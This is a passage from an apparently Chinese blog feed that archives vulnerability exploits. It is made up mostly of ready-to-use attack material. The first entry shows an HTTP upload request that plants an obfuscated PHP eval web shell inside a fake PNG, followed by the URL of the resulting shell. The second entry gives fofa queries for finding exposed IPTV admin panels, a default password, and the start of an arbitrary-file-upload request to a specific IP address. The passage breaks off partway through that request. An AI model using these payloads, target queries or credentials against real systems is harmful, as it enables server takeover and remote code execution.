    <content type="html"><![CDATA[<p>body&#x3D;”assets&#x2F;php&#x2F;timestamp.php”</p><p>exp:</p><figure class="highlight http"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs http"><span class="hljs-keyword">POST</span> <span class="hljs-string">/assets/php/upload.php</span> <span class="hljs-meta">HTTP/1.1</span><br><span class="hljs-attribute">Host</span><span class="hljs-punctuation">: </span>your-ip<br><span class="hljs-attribute">User-Agent</span><span class="hljs-punctuation">: </span>Mozilla/5.0 (Macintosh; Intel Mac OS X 11_4)<br><span class="hljs-attribute">Accept-Encoding</span><span class="hljs-punctuation">: </span>gzip, deflate<br><span class="hljs-attribute">Accept</span><span class="hljs-punctuation">: </span>*/*<br><span class="hljs-attribute">Connection</span><span class="hljs-punctuation">: </span>keep-alive<br><span class="hljs-attribute">Content-Type</span><span class="hljs-punctuation">: </span>multipart/form-data; boundary=----WebKitFormBoundaryMmx988TUuintqO4Q<br><br><span class="language-wren"><span class="hljs-operator">-</span><span class="hljs-operator">-</span><span class="hljs-operator">-</span><span class="hljs-operator">-</span><span class="hljs-operator">-</span><span class="hljs-operator">-</span><span class="hljs-title class_">WebKitFormBoundaryMmx</span>988TUuintqO4Q</span><br><span class="language-wren"><span class="hljs-title class_">Content</span><span class="hljs-operator">-</span><span class="hljs-title class_">Disposition</span>: form<span class="hljs-operator">-</span><span class="hljs-variable">data</span>; <span class="hljs-variable">name</span><span class="hljs-operator">=</span><span class="hljs-string">&quot;fileToUpload&quot;</span>; <span class="hljs-variable">filename</span><span class="hljs-operator">=</span><span class="hljs-string">&quot;shell.php&quot;</span></span><br><span class="language-wren"><span class="hljs-title class_">Content</span><span class="hljs-operator">-</span><span class="hljs-title class_">Type</span>: <span class="hljs-variable">image</span>/<span class="hljs-title function_">png</span></span><br><span class="language-wren"></span><br><span class="language-wren">&#123;&#123;<span class="hljs-title function_">unquote</span>(<span class="hljs-string">&quot;<span class="hljs-char escape_">\x89</span>PNG\x0d\x0a\x1a\x0a<span class="hljs-char escape_">\x00</span><span class="hljs-char escape_">\x00</span><span class="hljs-char escape_">\x00</span>\x0dIHDR<span class="hljs-char escape_">\x00</span><span class="hljs-char escape_">\x00</span><span class="hljs-char escape_">\x01</span><span class="hljs-char escape_">\x00</span><span class="hljs-char escape_">\x00</span><span class="hljs-char escape_">\x00</span><span class="hljs-char escape_">\x01</span><span class="hljs-char escape_">\x00</span><span class="hljs-char escape_">\x08</span><span class="hljs-char escape_">\x06</span><span class="hljs-char escape_">\x00</span><span class="hljs-char escape_">\x00</span><span class="hljs-char escape_">\x00</span><span class="hljs-char escape_">\\</span>r\xa8f<span class="hljs-char escape_">\x00</span><span class="hljs-char escape_">\x00</span><span class="hljs-char escape_">\x03</span>\x1eIDATx\x9c\xed\xd4<span class="hljs-char escape_">\x01</span><span class="hljs-char escape_">\x09</span><span class="hljs-char escape_">\x00</span>A<span class="hljs-char escape_">\x10</span>\xc4\xb0Yx\xff<span class="hljs-char escape_">\x96</span>\xef<span class="hljs-char escape_">\x85</span>4<span class="hljs-char escape_">\x81</span>Z\xe8m\xef\xdd6I\xbd\xbe\xdd<span class="hljs-char escape_">\x80</span><span class="hljs-char escape_">\x28</span><span class="hljs-char escape_">\x03</span><span class="hljs-char escape_">\x80</span>0<span class="hljs-char escape_">\x03</span><span class="hljs-char escape_">\x80</span>0<span class="hljs-char escape_">\x03</span><span class="hljs-char escape_">\x80</span>0<span class="hljs-char escape_">\x03</span><span class="hljs-char escape_">\x80</span>0<span class="hljs-char escape_">\x03</span><span class="hljs-char escape_">\x80</span>0<span class="hljs-char escape_">\x03</span><span class="hljs-char escape_">\x80</span>0<span class="hljs-char escape_">\x03</span><span class="hljs-char escape_">\x80</span>0<span class="hljs-char escape_">\x03</span><span class="hljs-char escape_">\x80</span>0<span class="hljs-char escape_">\x03</span><span class="hljs-char escape_">\x80</span>0<span class="hljs-char escape_">\x03</span><span class="hljs-char escape_">\x80</span>0<span class="hljs-char escape_">\x03</span><span class="hljs-char escape_">\x80</span>0<span class="hljs-char escape_">\x03</span><span class="hljs-char escape_">\x80</span>0<span class="hljs-char escape_">\x03</span><span class="hljs-char escape_">\x80</span>0<span class="hljs-char escape_">\x03</span><span class="hljs-char escape_">\x80</span>0<span class="hljs-char escape_">\x03</span><span class="hljs-char escape_">\x80</span>0<span class="hljs-char escape_">\x03</span><span class="hljs-char escape_">\x80</span>0<span class="hljs-char escape_">\x03</span><span class="hljs-char escape_">\x80</span>0<span class="hljs-char escape_">\x03</span><span class="hljs-char escape_">\x80</span>0<span class="hljs-char escape_">\x03</span><span class="hljs-char escape_">\x80</span>0<span class="hljs-char escape_">\x03</span><span class="hljs-char escape_">\x80</span>0<span class="hljs-char escape_">\x03</span><span class="hljs-char escape_">\x80</span>0<span class="hljs-char escape_">\x03</span><span class="hljs-char escape_">\x80</span>0<span class="hljs-char escape_">\x03</span><span class="hljs-char escape_">\x80</span>0<span class="hljs-char escape_">\x03</span><span class="hljs-char escape_">\x80</span>0<span class="hljs-char escape_">\x03</span><span class="hljs-char escape_">\x80</span>0<span class="hljs-char escape_">\x03</span><span class="hljs-char escape_">\x80</span>0<span class="hljs-char escape_">\x03</span><span class="hljs-char escape_">\x80</span>0<span class="hljs-char escape_">\x03</span><span class="hljs-char escape_">\x80</span>0<span class="hljs-char escape_">\x03</span><span class="hljs-char escape_">\x80</span>0<span class="hljs-char escape_">\x03</span><span class="hljs-char escape_">\x80</span>0<span class="hljs-char escape_">\x03</span><span class="hljs-char escape_">\x80</span>0<span class="hljs-char escape_">\x03</span><span class="hljs-char escape_">\x80</span>0<span class="hljs-char escape_">\x03</span><span class="hljs-char escape_">\x80</span>0<span class="hljs-char escape_">\x03</span><span class="hljs-char escape_">\x80</span>0<span class="hljs-char escape_">\x03</span><span class="hljs-char escape_">\x80</span>0<span class="hljs-char escape_">\x03</span><span class="hljs-char escape_">\x80</span>0<span class="hljs-char escape_">\x03</span><span class="hljs-char escape_">\x80</span>0<span class="hljs-char escape_">\x03</span><span class="hljs-char escape_">\x80</span>0<span class="hljs-char escape_">\x03</span><span class="hljs-char escape_">\x80</span>0<span class="hljs-char escape_">\x03</span><span class="hljs-char escape_">\x80</span>0<span class="hljs-char escape_">\x03</span><span class="hljs-char escape_">\x80</span>0<span class="hljs-char escape_">\x03</span><span class="hljs-char escape_">\x80</span>0<span class="hljs-char escape_">\x03</span><span class="hljs-char escape_">\x80</span>0<span class="hljs-char escape_">\x03</span><span class="hljs-char escape_">\x80</span>0<span class="hljs-char escape_">\x03</span><span class="hljs-char escape_">\x80</span>0<span class="hljs-char escape_">\x03</span><span class="hljs-char escape_">\x80</span>0<span class="hljs-char escape_">\x03</span><span class="hljs-char escape_">\x80</span>0<span class="hljs-char escape_">\x03</span><span class="hljs-char escape_">\x80</span>0<span class="hljs-char escape_">\x03</span><span class="hljs-char escape_">\x80</span>0<span class="hljs-char escape_">\x03</span><span class="hljs-char escape_">\x80</span>0<span class="hljs-char escape_">\x03</span><span class="hljs-char escape_">\x80</span>0<span class="hljs-char escape_">\x03</span><span class="hljs-char escape_">\x80</span>0<span class="hljs-char escape_">\x03</span><span class="hljs-char escape_">\x80</span>0<span class="hljs-char escape_">\x03</span><span class="hljs-char escape_">\x80</span>0<span class="hljs-char escape_">\x03</span><span class="hljs-char escape_">\x80</span>0<span class="hljs-char escape_">\x03</span><span class="hljs-char escape_">\x80</span>0<span class="hljs-char escape_">\x03</span><span class="hljs-char escape_">\x80</span>0<span class="hljs-char escape_">\x03</span><span class="hljs-char escape_">\x80</span>0<span class="hljs-char escape_">\x03</span><span class="hljs-char escape_">\x80</span>0<span class="hljs-char escape_">\x03</span><span class="hljs-char escape_">\x80</span>0<span class="hljs-char escape_">\x03</span><span class="hljs-char escape_">\x80</span>0<span class="hljs-char escape_">\x03</span><span class="hljs-char escape_">\x80</span>0<span class="hljs-char escape_">\x03</span><span class="hljs-char escape_">\x80</span>0<span class="hljs-char escape_">\x03</span><span class="hljs-char escape_">\x80</span>0<span class="hljs-char escape_">\x03</span><span class="hljs-char escape_">\x80</span>0<span class="hljs-char escape_">\x03</span><span class="hljs-char escape_">\x80</span>0<span class="hljs-char escape_">\x03</span><span class="hljs-char escape_">\x80</span>0<span class="hljs-char escape_">\x03</span><span class="hljs-char escape_">\x80</span>0<span class="hljs-char escape_">\x03</span><span class="hljs-char escape_">\x80</span>0<span class="hljs-char escape_">\x03</span><span class="hljs-char escape_">\x80</span>0<span class="hljs-char escape_">\x03</span><span class="hljs-char escape_">\x80</span>0<span class="hljs-char escape_">\x03</span><span class="hljs-char escape_">\x80</span>0<span class="hljs-char escape_">\x03</span><span class="hljs-char escape_">\x80</span>0<span class="hljs-char escape_">\x03</span><span class="hljs-char escape_">\x80</span>0<span class="hljs-char escape_">\x03</span><span class="hljs-char escape_">\x80</span>0<span class="hljs-char escape_">\x03</span><span class="hljs-char escape_">\x80</span>0<span class="hljs-char escape_">\x03</span><span class="hljs-char escape_">\x80</span>0<span class="hljs-char escape_">\x03</span><span class="hljs-char escape_">\x80</span>0<span class="hljs-char escape_">\x03</span><span class="hljs-char escape_">\x80</span>0<span class="hljs-char escape_">\x03</span><span class="hljs-char escape_">\x80</span>0<span class="hljs-char escape_">\x03</span><span class="hljs-char escape_">\x80</span>0<span class="hljs-char escape_">\x03</span><span class="hljs-char escape_">\x80</span>0<span class="hljs-char escape_">\x03</span><span class="hljs-char escape_">\x80</span>0<span class="hljs-char escape_">\x03</span><span class="hljs-char escape_">\x80</span>0<span class="hljs-char escape_">\x03</span><span class="hljs-char escape_">\x80</span>0<span class="hljs-char escape_">\x03</span><span class="hljs-char escape_">\x80</span>0<span class="hljs-char escape_">\x03</span><span class="hljs-char escape_">\x80</span>0<span class="hljs-char escape_">\x03</span><span class="hljs-char escape_">\x80</span>0<span class="hljs-char escape_">\x03</span><span class="hljs-char escape_">\x80</span>0<span class="hljs-char escape_">\x03</span><span class="hljs-char escape_">\x80</span>0<span class="hljs-char escape_">\x03</span><span class="hljs-char escape_">\x80</span>0<span class="hljs-char escape_">\x03</span><span class="hljs-char escape_">\x80</span>0<span class="hljs-char escape_">\x03</span><span class="hljs-char escape_">\x80</span>0<span class="hljs-char escape_">\x03</span><span class="hljs-char escape_">\x80</span>0<span class="hljs-char escape_">\x03</span><span class="hljs-char escape_">\x80</span>0<span class="hljs-char escape_">\x03</span><span class="hljs-char escape_">\x80</span>0<span class="hljs-char escape_">\x03</span><span class="hljs-char escape_">\x80</span>0<span class="hljs-char escape_">\x03</span><span class="hljs-char escape_">\x80</span>0<span class="hljs-char escape_">\x03</span><span class="hljs-char escape_">\x80</span>0<span class="hljs-char escape_">\x03</span><span class="hljs-char escape_">\x80</span>0<span class="hljs-char escape_">\x03</span><span class="hljs-char escape_">\x80</span>0<span class="hljs-char escape_">\x03</span><span class="hljs-char escape_">\x80</span>0<span class="hljs-char escape_">\x03</span><span class="hljs-char escape_">\x80</span>0<span class="hljs-char escape_">\x03</span><span class="hljs-char escape_">\x80</span>0<span class="hljs-char escape_">\x03</span><span class="hljs-char escape_">\x80</span>0<span class="hljs-char escape_">\x03</span><span class="hljs-char escape_">\x80</span>0<span class="hljs-char escape_">\x03</span><span class="hljs-char escape_">\x80</span>0<span class="hljs-char escape_">\x03</span><span class="hljs-char escape_">\x80</span>0<span class="hljs-char escape_">\x03</span><span class="hljs-char escape_">\x80</span>0<span class="hljs-char escape_">\x03</span><span class="hljs-char escape_">\x80</span>0<span class="hljs-char escape_">\x03</span><span class="hljs-char escape_">\x80</span>0<span class="hljs-char escape_">\x03</span><span class="hljs-char escape_">\x80</span>0<span class="hljs-char escape_">\x03</span><span class="hljs-char escape_">\x80</span>0<span class="hljs-char escape_">\x03</span><span class="hljs-char escape_">\x80</span>0<span class="hljs-char escape_">\x03</span><span class="hljs-char escape_">\x80</span>0<span class="hljs-char escape_">\x03</span><span class="hljs-char escape_">\x80</span>0<span class="hljs-char escape_">\x03</span><span class="hljs-char escape_">\x80</span>0<span class="hljs-char escape_">\x03</span><span class="hljs-char escape_">\x80</span>0<span class="hljs-char escape_">\x03</span><span class="hljs-char escape_">\x80</span>0<span class="hljs-char escape_">\x03</span><span class="hljs-char escape_">\x80</span>0<span class="hljs-char escape_">\x03</span><span class="hljs-char escape_">\x80</span>0<span class="hljs-char escape_">\x03</span><span class="hljs-char escape_">\x80</span>0<span class="hljs-char escape_">\x03</span><span class="hljs-char escape_">\x80</span>0<span class="hljs-char escape_">\x03</span><span class="hljs-char escape_">\x80</span>0<span class="hljs-char escape_">\x03</span><span class="hljs-char escape_">\x80</span>0<span class="hljs-char escape_">\x03</span><span class="hljs-char escape_">\x80</span>0<span class="hljs-char escape_">\x03</span><span class="hljs-char escape_">\x80</span>0<span class="hljs-char escape_">\x03</span><span class="hljs-char escape_">\x80</span>0<span class="hljs-char escape_">\x03</span><span class="hljs-char escape_">\x80</span>0<span class="hljs-char escape_">\x03</span><span class="hljs-char escape_">\x80</span>0<span class="hljs-char escape_">\x03</span><span class="hljs-char escape_">\x80</span>0<span class="hljs-char escape_">\x03</span><span class="hljs-char escape_">\x80</span>0<span class="hljs-char escape_">\x03</span><span class="hljs-char escape_">\x80</span>0<span class="hljs-char escape_">\x03</span><span class="hljs-char escape_">\x80</span>0<span class="hljs-char escape_">\x03</span><span class="hljs-char escape_">\x80</span>0<span class="hljs-char escape_">\x03</span><span class="hljs-char escape_">\x80</span>0<span class="hljs-char escape_">\x03</span><span class="hljs-char escape_">\x80</span>0<span class="hljs-char escape_">\x03</span><span class="hljs-char escape_">\x80</span>0<span class="hljs-char escape_">\x03</span><span class="hljs-char escape_">\x80</span>0<span class="hljs-char escape_">\x03</span><span class="hljs-char escape_">\x80</span>0<span class="hljs-char escape_">\x03</span><span class="hljs-char escape_">\x80</span>0<span class="hljs-char escape_">\x03</span><span class="hljs-char escape_">\x80</span>0<span class="hljs-char escape_">\x03</span><span class="hljs-char escape_">\x80</span>0<span class="hljs-char escape_">\x03</span><span class="hljs-char escape_">\x80</span>0<span class="hljs-char escape_">\x03</span><span class="hljs-char escape_">\x80</span>0<span class="hljs-char escape_">\x03</span><span class="hljs-char escape_">\x80</span>0<span class="hljs-char escape_">\x03</span><span class="hljs-char escape_">\x80</span>0<span class="hljs-char escape_">\x03</span><span class="hljs-char escape_">\x80</span>0<span class="hljs-char escape_">\x03</span><span class="hljs-char escape_">\x80</span>0<span class="hljs-char escape_">\x03</span><span class="hljs-char escape_">\x80</span>0<span class="hljs-char escape_">\x03</span><span class="hljs-char escape_">\x80</span>0<span class="hljs-char escape_">\x03</span><span class="hljs-char escape_">\x80</span>0<span class="hljs-char escape_">\x03</span><span class="hljs-char escape_">\x80</span>0<span class="hljs-char escape_">\x03</span><span class="hljs-char escape_">\x80</span>0<span class="hljs-char escape_">\x03</span><span class="hljs-char escape_">\x80</span>0<span class="hljs-char escape_">\x03</span><span class="hljs-char escape_">\x80</span>0<span class="hljs-char escape_">\x03</span><span class="hljs-char escape_">\x80</span>0<span class="hljs-char escape_">\x03</span><span class="hljs-char escape_">\x80</span>0<span class="hljs-char escape_">\x03</span><span class="hljs-char escape_">\x80</span>0<span class="hljs-char escape_">\x03</span><span class="hljs-char escape_">\x80</span>0<span class="hljs-char escape_">\x03</span><span class="hljs-char escape_">\x80</span>0<span class="hljs-char escape_">\x03</span><span class="hljs-char escape_">\x80</span>0<span class="hljs-char escape_">\x03</span><span class="hljs-char escape_">\x80</span>0<span class="hljs-char escape_">\x03</span><span class="hljs-char escape_">\x80</span>0<span class="hljs-char escape_">\x03</span><span class="hljs-char escape_">\x80</span>0<span class="hljs-char escape_">\x03</span><span class="hljs-char escape_">\x80</span>0<span class="hljs-char escape_">\x03</span><span class="hljs-char escape_">\x80</span>0<span class="hljs-char escape_">\x03</span><span class="hljs-char escape_">\x80</span>0<span class="hljs-char escape_">\x03</span><span class="hljs-char escape_">\x80</span>0<span class="hljs-char escape_">\x03</span><span class="hljs-char escape_">\x80</span>0<span class="hljs-char escape_">\x03</span><span class="hljs-char escape_">\x80</span>0<span class="hljs-char escape_">\x03</span><span class="hljs-char escape_">\x80</span>0<span class="hljs-char escape_">\x03</span><span class="hljs-char escape_">\x80</span>0<span class="hljs-char escape_">\x03</span><span class="hljs-char escape_">\x80</span>0<span class="hljs-char escape_">\x03</span><span class="hljs-char escape_">\x80</span>0<span class="hljs-char escape_">\x03</span><span class="hljs-char escape_">\x80</span>0<span class="hljs-char escape_">\x03</span><span class="hljs-char escape_">\x80</span>0<span class="hljs-char escape_">\x03</span><span class="hljs-char escape_">\x80</span>0<span class="hljs-char escape_">\x03</span><span class="hljs-char escape_">\x80</span>0<span class="hljs-char escape_">\x03</span><span class="hljs-char escape_">\x80</span>0<span class="hljs-char escape_">\x03</span><span class="hljs-char escape_">\x80</span>0<span class="hljs-char escape_">\x03</span><span class="hljs-char escape_">\x80</span>0<span class="hljs-char escape_">\x03</span><span class="hljs-char escape_">\x80</span>0<span class="hljs-char escape_">\x03</span><span class="hljs-char escape_">\x80</span>0<span class="hljs-char escape_">\x03</span><span class="hljs-char escape_">\x80</span>0<span class="hljs-char escape_">\x03</span><span class="hljs-char escape_">\x80</span>0<span class="hljs-char escape_">\x03</span><span class="hljs-char escape_">\x80</span>0<span class="hljs-char escape_">\x03</span><span class="hljs-char escape_">\x80</span>0<span class="hljs-char escape_">\x03</span><span class="hljs-char escape_">\x80</span>0<span class="hljs-char escape_">\x03</span><span class="hljs-char escape_">\x80</span>0<span class="hljs-char escape_">\x03</span><span class="hljs-char escape_">\x80</span>0<span class="hljs-char escape_">\x03</span><span class="hljs-char escape_">\x80</span>0<span class="hljs-char escape_">\x03</span><span class="hljs-char escape_">\x80</span>0<span class="hljs-char escape_">\x03</span><span class="hljs-char escape_">\x80</span>0<span class="hljs-char escape_">\x03</span><span class="hljs-char escape_">\x80</span>0<span class="hljs-char escape_">\x03</span><span class="hljs-char escape_">\x80</span>0<span class="hljs-char escape_">\x03</span><span class="hljs-char escape_">\x80</span>0<span class="hljs-char escape_">\x03</span><span class="hljs-char escape_">\x80</span>0<span class="hljs-char escape_">\x03</span><span class="hljs-char escape_">\x80</span>0<span class="hljs-char escape_">\x03</span><span class="hljs-char escape_">\x80</span>0<span class="hljs-char escape_">\x03</span><span class="hljs-char escape_">\x80</span>0<span class="hljs-char escape_">\x03</span><span class="hljs-char escape_">\x80</span>0<span class="hljs-char escape_">\x03</span><span class="hljs-char escape_">\x80</span>0<span class="hljs-char escape_">\x03</span><span class="hljs-char escape_">\x80</span>0<span class="hljs-char escape_">\x03</span><span class="hljs-char escape_">\x80</span>0<span class="hljs-char escape_">\x03</span><span class="hljs-char escape_">\x80</span>0<span class="hljs-char escape_">\x03</span><span class="hljs-char escape_">\x80</span>0<span class="hljs-char escape_">\x03</span><span class="hljs-char escape_">\x80</span>0<span class="hljs-char escape_">\x03</span><span class="hljs-char escape_">\x80</span>0<span class="hljs-char escape_">\x03</span><span class="hljs-char escape_">\x80</span>0<span class="hljs-char escape_">\x03</span><span class="hljs-char escape_">\x80</span>0<span class="hljs-char escape_">\x03</span><span class="hljs-char escape_">\x80</span>0<span class="hljs-char escape_">\x03</span><span class="hljs-char escape_">\x80</span>0<span class="hljs-char escape_">\x03</span><span class="hljs-char escape_">\x80</span>0<span class="hljs-char escape_">\x03</span><span class="hljs-char escape_">\x80</span>0<span class="hljs-char escape_">\x03</span><span class="hljs-char escape_">\x80</span>0<span class="hljs-char escape_">\x03</span><span class="hljs-char escape_">\x80</span>0<span class="hljs-char escape_">\x03</span><span class="hljs-char escape_">\x80</span>0<span class="hljs-char escape_">\x03</span><span class="hljs-char escape_">\x80</span>0<span class="hljs-char escape_">\x03</span><span class="hljs-char escape_">\x80</span>0<span class="hljs-char escape_">\x03</span><span class="hljs-char escape_">\x80</span>0<span class="hljs-char escape_">\x03</span><span class="hljs-char escape_">\x80</span>0<span class="hljs-char escape_">\x03</span><span class="hljs-char escape_">\x80</span>0<span class="hljs-char escape_">\x03</span><span class="hljs-char escape_">\x80</span>0<span class="hljs-char escape_">\x03</span><span class="hljs-char escape_">\x80</span>0<span class="hljs-char escape_">\x03</span><span class="hljs-char escape_">\x80</span>0<span class="hljs-char escape_">\x03</span><span class="hljs-char escape_">\x80</span>0<span class="hljs-char escape_">\x03</span><span class="hljs-char escape_">\x80</span>0<span class="hljs-char escape_">\x03</span><span class="hljs-char escape_">\x80</span>0<span class="hljs-char escape_">\x03</span><span class="hljs-char escape_">\x80</span>0<span class="hljs-char escape_">\x03</span><span class="hljs-char escape_">\x80</span>0<span class="hljs-char escape_">\x03</span><span class="hljs-char escape_">\x80</span>0<span class="hljs-char escape_">\x03</span><span class="hljs-char escape_">\x80</span>0<span class="hljs-char escape_">\x03</span><span class="hljs-char escape_">\x80</span>0<span class="hljs-char escape_">\x03</span><span class="hljs-char escape_">\x80</span>0<span class="hljs-char escape_">\x03</span><span class="hljs-char escape_">\x80</span>0<span class="hljs-char escape_">\x03</span><span class="hljs-char escape_">\x80</span>0<span class="hljs-char escape_">\x03</span><span class="hljs-char escape_">\x80</span>0<span class="hljs-char escape_">\x03</span><span class="hljs-char escape_">\x80</span>0<span class="hljs-char escape_">\x03</span><span class="hljs-char escape_">\x80</span>0<span class="hljs-char escape_">\x03</span><span class="hljs-char escape_">\x80</span>0<span class="hljs-char escape_">\x03</span><span class="hljs-char escape_">\x80</span>0<span class="hljs-char escape_">\x03</span><span class="hljs-char escape_">\x80</span>0<span class="hljs-char escape_">\x03</span><span class="hljs-char escape_">\x80</span>0<span class="hljs-char escape_">\x03</span><span class="hljs-char escape_">\x80</span>0<span class="hljs-char escape_">\x03</span><span class="hljs-char escape_">\x80</span>0<span class="hljs-char escape_">\x03</span><span class="hljs-char escape_">\x80</span>0<span class="hljs-char escape_">\x03</span><span class="hljs-char escape_">\x80</span>0<span class="hljs-char escape_">\x03</span><span class="hljs-char escape_">\x80</span>0<span class="hljs-char escape_">\x03</span><span class="hljs-char escape_">\x80</span>0<span class="hljs-char escape_">\x03</span><span class="hljs-char escape_">\x80</span>0<span class="hljs-char escape_">\x03</span><span class="hljs-char escape_">\x80</span>0<span class="hljs-char escape_">\x03</span><span class="hljs-char escape_">\x80</span>0<span class="hljs-char escape_">\x03</span><span class="hljs-char escape_">\x80</span>\xb0\x1f\xbd\xf4<span class="hljs-char escape_">\x07</span>\xfa\xeb&gt;\xbe\xab<span class="hljs-char escape_">\x00</span><span class="hljs-char escape_">\x00</span><span class="hljs-char escape_">\x00</span><span class="hljs-char escape_">\x00</span>IEND\xaeB`<span class="hljs-char escape_">\x82</span>\x0d\x0a&lt;?php class Gn261550 \x7b public function __construct<span class="hljs-char escape_">\x28</span>$HW579<span class="hljs-char escape_">\x29</span>\x7b @eval<span class="hljs-char escape_">\x28</span><span class="hljs-char escape_">\&quot;</span>/*ZWabn8zLCk*/<span class="hljs-char escape_">\&quot;</span>.$HW579.<span class="hljs-char escape_">\&quot;</span>/*ZWabn8zLCk*/<span class="hljs-char escape_">\&quot;</span><span class="hljs-char escape_">\x29</span>; \x7d\x7dnew Gn261550<span class="hljs-char escape_">\x28</span>$_REQUEST[&#x27;123&#x27;]<span class="hljs-char escape_">\x29</span>;?&gt;&quot;</span>)&#125;&#125;</span><br><span class="language-wren"><span class="hljs-operator">-</span><span class="hljs-operator">-</span><span class="hljs-operator">-</span><span class="hljs-operator">-</span><span class="hljs-operator">-</span><span class="hljs-operator">-</span><span class="hljs-title class_">WebKitFormBoundaryMmx</span>988TUuintqO4Q<span class="hljs-operator">-</span><span class="hljs-operator">-</span></span><br></code></pre></div></td></tr></table></figure><p><a href="http://x.x.x.x/assets/data/usrimg/shell.php">http://x.x.x.x/assets/data/usrimg/shell.php</a></p>]]></content>
    
    
    
    <tags>
      
      <tag>漏洞备份</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>智***IPTV后台存在任意文件上传漏洞</title>
    <link href="/2024/11/13/%E6%99%BA-IPTV%E5%90%8E%E5%8F%B0%E5%AD%98%E5%9C%A8%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E6%BC%8F%E6%B4%9E/"/>
    <url>/2024/11/13/%E6%99%BA-IPTV%E5%90%8E%E5%8F%B0%E5%AD%98%E5%9C%A8%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E6%BC%8F%E6%B4%9E/</url>
    
    <content type="html"><![CDATA[<p>空间测绘，使用以下关键词进行检索：</p><p>fofa:body&#x3D;”ZHGXTV”<br>web.icon&#x3D;”b8fe4c2f208ff1dc211f537f0a4db342”</p><p>使用默认口令（弱口令）【admin &#x2F; aA123456】登录系统后，可构造类似与以下所展示的数据包，进行任意文件上传，包括PHP文件上传并执行。</p><figure class="highlight http"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs http"><span class="hljs-keyword">POST</span> <span class="hljs-string">/ZHGXTV/index.php/admin/index/web_upload_template.html</span> <span class="hljs-meta">HTTP/1.1</span><br><span class="hljs-attribute">Host</span><span class="hljs-punctuation">: </span>118.77.61.149:888<br><span class="hljs-attribute">Content-Length</span><span class="hljs-punctuation">: </span>893<br><span class="hljs-attribute">User-Agent</span><span class="hljs-punctuation">: </span>Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/115.0.0.0 Safari/537.36<br><span class="hljs-attribute">Content-Type</span><span class="hljs-punctuation">: </span>multipart/form-data; boundary=----WebKitFormBoundaryZzN3aF71HnOAXhI3<br><span class="hljs-attribute">Accept</span><span class="hljs-punctuation">: </span>*/*<br><span class="hljs-attribute">Origin</span><span class="hljs-punctuation">: </span>http://118.77.61.149:888<br><span class="hljs-attribute">Referer</span><span class="hljs-punctuation">: </span>http://118.77.61.149:888/ZHGXTV/index.php/admin/index/upload_templates.html<br><span class="hljs-attribute">Accept-Encoding</span><span class="hljs-punctuation">: </span>gzip, deflate<br><span class="hljs-attribute">Accept-Language</span><span class="hljs-punctuation">: </span>zh-CN,zh;q=0.9<br><span class="hljs-attribute">Cookie</span><span class="hljs-punctuation">: </span>PHPSESSID=k9858i4ie8r50o8mhil3p9gklt<br><span class="hljs-attribute">Connection</span><span class="hljs-punctuation">: </span>close<br><br><span class="language-pgsql"><span class="hljs-comment">------WebKitFormBoundaryZzN3aF71HnOAXhI3</span></span><br><span class="language-pgsql">Content-Disposition: form-data; <span class="hljs-type">name</span>=&quot;folder&quot;</span><br><span class="language-pgsql"></span><br><span class="language-pgsql">upload_template</span><br><span class="language-pgsql"></span><br><span class="language-pgsql"><span class="hljs-comment">------WebKitFormBoundaryZzN3aF71HnOAXhI3</span></span><br><span class="language-pgsql">Content-Disposition: form-data; <span class="hljs-type">name</span>=&quot;id&quot;</span><br><span class="language-pgsql"></span><br><span class="language-pgsql">WU_FILE_0</span><br><span class="language-pgsql"><span class="hljs-comment">------WebKitFormBoundaryZzN3aF71HnOAXhI3</span></span><br><span class="language-pgsql"></span><br><span class="language-pgsql">Content-Disposition: form-data; <span class="hljs-type">name</span>=&quot;name&quot;</span><br><span class="language-pgsql"></span><br><span class="language-pgsql"><span class="hljs-number">1.</span>php</span><br><span class="language-pgsql"></span><br><span class="language-pgsql"><span class="hljs-comment">------WebKitFormBoundaryZzN3aF71HnOAXhI3</span></span><br><span class="language-pgsql">Content-Disposition: form-data; <span class="hljs-type">name</span>=&quot;type&quot;</span><br><span class="language-pgsql"></span><br><span class="language-pgsql">application/octet-stream</span><br><span class="language-pgsql"></span><br><span class="language-pgsql"><span class="hljs-comment">------WebKitFormBoundaryZzN3aF71HnOAXhI3</span></span><br><span class="language-pgsql">Content-Disposition: form-data; <span class="hljs-type">name</span>=&quot;lastModifiedDate&quot;</span><br><span class="language-pgsql"></span><br><span class="language-pgsql">Wed Jul <span class="hljs-number">12</span> <span class="hljs-number">2023</span> <span class="hljs-number">10</span>:<span class="hljs-number">10</span>:<span class="hljs-number">53</span> GMT+<span class="hljs-number">0800</span> (中国标准时间)</span><br><span class="language-pgsql"></span><br><span class="language-pgsql"><span 